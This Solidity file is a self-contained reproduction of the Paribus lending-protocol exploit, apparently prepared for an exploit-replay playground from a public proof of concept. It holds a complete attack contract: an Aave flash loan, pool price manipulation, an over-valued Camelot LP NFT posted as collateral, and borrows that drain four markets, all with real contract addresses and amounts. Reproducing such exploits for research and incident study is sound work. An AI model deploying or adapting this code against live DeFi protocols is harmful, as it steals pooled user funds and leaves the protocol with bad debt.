// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-01-Paribus).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the Aave flash-loan callback `executeOperation` lives
// on the test contract itself), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Paribus_exp.sol (ParibusExploit.testExploit / executeOperation),
// interfaces inlined (no imports so it compiles anywhere), so all downstream
// config fields (profitReceiver "exploit", editorial anchored on the pETH market)
// work unchanged.
//
// Root cause: Paribus's pNFT collateral market (PNFTTokenDelegator / the NFT
// Comptroller) values a freshly-minted Camelot V3 LP position (deposited as
// collateral) far above the capital actually supplied. The attacker flash-borrows
// USDT, buys PBX to skew the PBX/USDT pool, mints a wildly over-valued Camelot LP
// NFT, deposits it as collateral, then borrows out pETH/pARB/pWBTC/pUSDT against
// that phantom collateral value, leaving the protocol with bad debt.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IAaveFlashloan {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface CamelotRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 limitSqrtPrice;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface NFTPositionManager {
    struct MintParams {
        address token0;
        address token1;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(
        MintParams calldata params
    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    function mint(uint256) external;

    function approve(address to, uint256 tokenId) external;
}

interface ControllerNFT {
    function enterNFTMarkets(address[] calldata pNFTTokens) external;
}

interface PBXToken {
    function borrow(uint256) external returns (uint256);
}

contract ParibusDrain {
    IAaveFlashloan private constant Aave = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    CamelotRouter private constant CamelotRouterV3 = CamelotRouter(0x1F721E2E82F6676FCE4eA07A5958cF098D339e18);
    Uni_Router_V3 private constant UniswapRouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    NFTPositionManager private constant CamelotNFTPositionManager =
        NFTPositionManager(0x00c7f3082833e796A5b3e4Bd59f6642FF44DCD15);
    ControllerNFT private constant ComptrollerNFT = ControllerNFT(0x712E2B12D75fe092838A3D2ad14B6fF73d3fdbc9);
    NFTPositionManager private constant PNFTTokenDelegator =
        NFTPositionManager(0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26);

    IERC20 private constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 private constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 private constant PBX = IERC20(0xbAD58ed9b5f26A002ea250D7A60dC6729a4a2403);

    PBXToken private constant pETH = PBXToken(0xAffd437801434643B734D0B2853654876F66f7D7);
    PBXToken private constant pARB = PBXToken(0xFc2737a742A741d13fE6326011a78cd881dE3Eb9);
    PBXToken private constant pWBTC = PBXToken(0x1c762E00f1D9317a4214d22b2576995C427F61c9);
    PBXToken private constant pUSDT = PBXToken(0xFB1dcFc67cC496Eb0cC592050AF7Fdf3bF3b5C13);

    // Recorded attack: flash-borrow USDT from Aave, run the whole Paribus
    // over-valued-collateral drain in the callback, repay.
    function run() external {
        Aave.flashLoanSimple(address(this), address(USDT), 3093209807085, bytes(""), 0);
    }

    function executeOperation(
        address,
        uint256,
        uint256,
        address,
        bytes calldata
    ) external returns (bool) {
        WETH.approve(address(CamelotRouterV3), type(uint256).max);
        WBTC.approve(address(CamelotRouterV3), type(uint256).max);
        USDT.approve(address(CamelotRouterV3), type(uint256).max);
        PBX.approve(address(CamelotRouterV3), type(uint256).max);
        WBTC.approve(address(UniswapRouterV3), type(uint256).max);
        USDT.approve(address(CamelotNFTPositionManager), type(uint256).max);
        PBX.approve(address(CamelotNFTPositionManager), type(uint256).max);

        CamelotRouter.ExactInputSingleParams memory CamelotStructure = CamelotRouter.ExactInputSingleParams(
            address(USDT),
            address(PBX),
            address(this),
            1737200705,
            1000000000000,
            0,
            0
        );
        CamelotRouterV3.exactInputSingle(CamelotStructure);

        NFTPositionManager.MintParams memory Structure = NFTPositionManager.MintParams(
            address(PBX),
            address(USDT),
            -870000,
            870000,
            789722754473453300405586192,
            500000000000,
            0,
            0,
            address(this),
            1737200720
        );
        CamelotNFTPositionManager.mint(Structure);
        CamelotNFTPositionManager.approve(address(PNFTTokenDelegator), 224023);

        address[] memory markets = new address[](1);
        markets[0] = address(PNFTTokenDelegator);
        ComptrollerNFT.enterNFTMarkets(markets);
        PNFTTokenDelegator.mint(224023);
        pETH.borrow(12599960598441767978);
        pARB.borrow(6510273280264926258675);
        pWBTC.borrow(36729789);
        pUSDT.borrow(3924210566);

        CamelotRouter.ExactInputSingleParams memory CamelotStructure2 = CamelotRouter.ExactInputSingleParams(
            address(PBX),
            address(USDT),
            address(this),
            1737200705,
            31033846713245530612217763,
            0,
            0
        );
        CamelotRouterV3.exactInputSingle(CamelotStructure2);

        Uni_Router_V3.ExactInputSingleParams memory paramsUniswap = Uni_Router_V3.ExactInputSingleParams(
            address(WBTC),
            address(USDT),
            500,
            address(this),
            1737200705,
            36729789,
            0,
            0
        );
        UniswapRouterV3.exactInputSingle(paramsUniswap);

        USDT.approve(address(Aave), type(uint256).max);
        return true;
    }

    // The pETH (native-ETH) market sends borrowed ETH to the borrower via a
    // low-level call; without this receive() the ETH borrow leg reverts.
    receive() external payable {}
}
